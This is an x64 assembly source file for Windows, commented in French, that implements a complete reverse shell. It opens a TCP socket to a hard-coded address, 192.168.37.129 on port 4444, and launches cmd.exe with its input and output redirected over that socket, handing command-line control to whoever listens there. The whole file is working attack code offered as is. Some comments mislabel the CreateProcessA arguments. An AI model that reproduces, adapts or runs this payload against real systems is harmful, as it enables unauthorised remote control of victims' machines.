; windows_reverse_shell.asm

extrn WSAStartup :PROC                      ; Importe la fonction WSAStartup de la bibliothèque ws2_32.dll.
extrn WSASocketA :PROC                      ; Importe la fonction WSASocketA de la bibliothèque ws2_32.dll.
extrn WSAConnect :PROC                      ; Importe la fonction WSAConnect de la bibliothèque ws2_32.dll.
extrn CreateProcessA :PROC                  ; Importe la fonction CreateProcessA de la bibliothèque kernel32.dll.
extrn WaitForSingleObject :PROC             ; Importe la fonction WaitForSingleObject de la bibliothèque kernel32.dll.
extrn ExitProcess :PROC                     ; Importe la fonction ExitProcess de la bibliothèque kernel32.dll.

; Définit la structure _STARTUPINFOA qui contient les paramètres de démarrage pour une application qui s'exécute dans un processus.
_STARTUPINFOA STRUCT
    cb              DWORD   ?               ; La taille de la structure, en octets.
    align_1         BYTE    4 dup (?)       ; Champ pour l'alignement mémoire.
    lpReserved      QWORD   ?               ; Doit être NULL.
    lpDesktop       QWORD   ?               ; Pointeur vers le nom du bureau, doit être NULL.
    lpTitle         QWORD   ?               ; Pointeur vers la ligne de commande.
    dwX             DWORD   ?               ; Position de la fenêtre.
    dwY             DWORD   ?               ; Position de la fenêtre.
    dwXSize         DWORD   ?               ; Taille de la fenêtre.
    dwYSize         DWORD   ?               ; Taille de la fenêtre.
    dwXCountChars   DWORD   ?               ; Nombre de caractères en X.
    dwYCountChars   DWORD   ?               ; Nombre de caractères en Y.
    dwFillAttribute DWORD   ?               ; Attributs pour remplir la fenêtre.
    dwFlags         DWORD   ?               ; Drapeaux.
    wShowWindow     WORD    ?               ; Indicateur de fenêtre visible.
    cbReserved2     WORD    ?               ; Doit être NULL.
    align_2         BYTE    4 dup (?)       ; Champ pour l'alignement mémoire.
    lpReserved2     QWORD   ?               ; Doit être NULL.
    hStdInput       QWORD   ?               ; Handle de l'entrée standard.
    hStdOuput       QWORD   ?               ; Handle de la sortie standard.
    hStdError       QWORD   ?               ; Handle de l'erreur standard.
_STARTUPINFOA ENDS

; Définit la structure _PROCESS_INFORMATION qui contient des informations sur un processus nouvellement créé et son thread principal.
_PROCESS_INFORMATION STRUCT
    hProcess        QWORD   ?               ; Un handle vers le processus nouvellement créé.
    hThread         QWORD   ?               ; Un handle vers le thread principal du processus nouvellement créé.
    dwProcessId     DWORD   ?               ; L'identifiant du processus nouvellement créé.
    dwThreadId      DWORD   ?               ; L'identifiant du thread principal du processus nouvellement créé.
_PROCESS_INFORMATION ENDS

; Définit la longueur maximale des champs de description et de statut dans la structure WSAData.
WSADESCRIPTION_LEN  EQU     256
WSASYS_STATUS_LEN   EQU     128

; Définit la structure _WSADATA qui est utilisée par la fonction WSAStartup pour renvoyer les informations requises pour initialiser une application Windows Sockets.
_WSADATA STRUCT
    wVersion        WORD    ?               ; Version de Windows Sockets disponible.
    wHighVersion    WORD    ?               ; Version de Windows Sockets la plus élevée disponible.
    szDescription   BYTE    (WSADESCRIPTION_LEN + 1) dup (?) ; Description ASCII.
    szSystemStatus  BYTE    (WSASYS_STATUS_LEN + 1) dup (?)  ; Statut ASCII.
    iMaxSockets     WORD    ?               ; Nombre maximal de sockets pouvant être ouverts.
    iMaxUdpDg       WORD    ?               ; Taille maximale d'un datagramme UDP.
    lpVendorInfo    QWORD   ?               ; Pointeur vers les informations spécifiques du fournisseur.
_WSADATA ENDS

; Définit la structure _sockaddr_in qui est utilisée par certaines fonctions pour spécifier une adresse IP et un numéro de port.
_sockaddr_in STRUCT
    sin_family      WORD    ?               ; Famille d'adresses, toujours AF_INET pour les applications Internet.
    sin_port        WORD    ?               ; Numéro de port.
    sin_addr        DWORD   ?               ; Adresse IP dans le réseau sous forme de nombre à virgule.
    sin_zero        BYTE    8 dup (?)       ; Ce champ est réservé et doit être mis à zéro.
_sockaddr_in ENDS


.data
    ip          DD 8125A8C0h                ; 192.168.37.129, l'adresse IP de destination en format hexadecimal
    port        DW 5C11h                    ; 4444, le port de destination en format hexadecimal
    shell_str   DB "cmd.exe", 0             ; La ligne de commande pour démarrer cmd.exe
    sd          DQ ?                        ; Socket descriptor
    sa          _sockaddr_in <>             ; Structure pour stocker l'adresse IP et le port
    WSAData     _WSADATA <>                 ; Structure pour stocker les informations sur Windows Sockets
    SUInfo      _STARTUPINFOA <>            ; Structure pour spécifier les paramètres de démarrage de cmd.exe
    Prcinfo     _PROCESS_INFORMATION <>     ; Structure pour stocker les informations sur le processus cmd.exe

.code

Start PROC
    SUB     rsp, 28h                        ; Crée de l'espace shadow

    MOV     rcx, 202h                       ; Version de Windows Sockets
    LEA     rdx, WSAData                    ; Pointeur vers la structure WSAData
    CALL    WSAStartup                      ; Initialise l'application à utiliser Windows Sockets

    SUB     rsp, 30h                        ; Crée de l'espace pour les paramètres
    MOV     rcx, 2                          ; Famille d'adresses AF_INET
    MOV     rdx, 1                          ; Type de socket SOCK_STREAM
    MOV     r8, 6                           ; Protocole TCP
    XOR     r9, r9                          ; Groupe de sockets par défaut
    MOV     qword ptr [rsp+40], 0           ; Interface par défaut
    MOV     qword ptr [rsp+32], 0           ; Réservé, doit être 0
    CALL    WSASocketA                      ; Crée un socket pour l'application
    ADD     rsp, 30h                        ; Réajuste le pointeur de pile
    MOV     sd, rax                         ; Stocke le descripteur de socket

    MOV     sa.sin_family, 2                ; Famille d'adresses AF_INET
    MOV     ax, port                        ; Numéro de port
    MOV     sa.sin_port, ax                 ; Stocke le port dans la structure sa
    MOV     eax, ip                         ; Adresse IP
    MOV     sa.sin_addr, eax                ; Stocke l'adresse IP dans la structure sa

    MOV     rax, sd                         ; Descripteur de socket
    MOV     SUInfo.hStdInput, rax           ; Le socket est utilisé comme entrée standard pour le nouveau processus
    MOV     SUInfo.hStdOuput, rax           ; Le socket est utilisé comme sortie standard pour le nouveau processus
    MOV     SUInfo.hStdError, rax           ; Le socket est utilisé comme erreur standard pour le nouveau processus
    MOV     SUInfo.cb, SIZEOF _STARTUPINFOA ; La taille de la structure, en octets
    MOV     SUInfo.dwFlags, 101h            ; STARTF_USESTDHANDLES est activé

    SUB     rsp, 38h                        ; Crée de l'espace pour les paramètres
    MOV     rcx, sd                         ; Descripteur de socket
    LEA     rdx, sa                         ; Pointeur vers la structure sa
    MOV     r8, SIZEOF _sockaddr_in         ; Taille de la structure sa
    XOR     r9, r9                          ; Longueur de l'option, 0 pour une connexion TCP/IP normale
    MOV     qword ptr [rsp+48], 0           ; Option par défaut, 0
    MOV     qword ptr [rsp+40], 0           ; Option par défaut, 0
    MOV     qword ptr [rsp+32], 0           ; Option par défaut, 0
    CALL    WSAConnect                      ; Se connecte au socket à l'adresse spécifiée
    ADD     rsp, 38h                        ; Réajuste le pointeur de pile

    SUB     rsp, 50h                        ; Crée de l'espace pour les paramètres
    XOR     rcx, rcx                        ; Pointeur vers le nom de l'application, NULL pour utiliser la ligne de commande
    LEA     rdx, shell_str                  ; Pointeur vers la ligne de commande
    XOR     r8, r8                          ; Pointeur vers le répertoire de travail actuel, NULL pour utiliser le répertoire actuel
    XOR     r9, r9                          ; Pointeur vers la structure SECURITY_ATTRIBUTES pour le nouveau processus, NULL pour l'attribut par défaut
    LEA     rax, Prcinfo                    ; Pointeur vers la structure PROCESS_INFORMATION
    MOV     qword ptr [rsp+72], rax         ; Stocke le pointeur vers la structure PROCESS_INFORMATION
    LEA     rax, SUInfo                     ; Pointeur vers la structure STARTUPINFOA
    MOV     qword ptr [rsp+64], rax         ; Stocke le pointeur vers la structure STARTUPINFOA
    MOV     qword ptr [rsp+56], 0           ; Options de création par défaut
    MOV     qword ptr [rsp+48], 0           ; Pointeur vers l'attribut d'héritage du descripteur de sécurité
    MOV     qword ptr [rsp+40], 0           ; Pointeur vers le descripteur de sécurité
    MOV     qword ptr [rsp+32], 1           ; Les poignées d'entrée, de sortie et d'erreur du nouveau processus sont héritées
    CALL    CreateProcessA                  ; Crée un nouveau processus et son thread principal
    ADD     rsp, 50h                        ; Réajuste le pointeur de pile

    XOR     rcx, rcx                        ; Code de sortie, 0 indique un succès
    CALL    ExitProcess                     ; Termine le processus actuel

Start ENDP
End


